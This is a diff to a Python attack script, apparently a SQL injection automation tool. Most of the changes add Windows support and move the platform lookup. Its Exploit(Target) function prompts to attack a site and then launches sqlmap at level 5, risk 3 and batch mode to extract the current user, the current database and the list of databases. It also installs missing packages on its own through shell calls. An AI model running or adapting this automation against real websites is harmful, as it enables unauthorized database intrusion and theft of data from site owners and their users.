@@ -1,6 +1,8 @@
-import os, platform, time, requests, sys, re, importlib
+import os, platform, time, requests, sys, re, importlib, wget
 from zipfile import ZipFile
 from urllib.parse import urlparse
+
+os_plat = platform.system()
 
 class c:
 	res     = "\33[0m"
@@ -10,11 +12,16 @@ class c:
 	y    = "\33[33m"
 
 def check_req(module_name, package_name):
-    try:
-        importlib.import_module(module_name)
-    except ImportError:
-        print("[!] Module " + module_name + " is missing")
-        os.system("pip3 install "+ package_name)
+        try:
+                importlib.import_module(module_name)
+
+        except ImportError:
+                if os_plat == 'Windows':
+                        print("[!] Module " + module_name + " is missing")
+                        os.system("py -m pip install "+ package_name)
+                else:
+                        print("[!] Module " + module_name + " is missing")
+                        os.system("pip3 install "+ package_name)
 
 check_req("wget", "wget")
 check_req("requests", "requests")
@@ -26,7 +33,6 @@ except:
     pass
 
 def depen():
-    os_plat = platform.system()
     if os_plat == 'Linux':
         with open('/etc/os-release') as cekos:
             l = cekos.read().splitlines()
@@ -137,7 +143,7 @@ def Exploit(Target):
                 if attack.lower().startswith("y"):
                     print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
                     if os_plat == 'Windows':
-                        os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && python .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
+                        os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && py .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
                     elif os_plat == 'Linux':
                         os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")  
                 else:
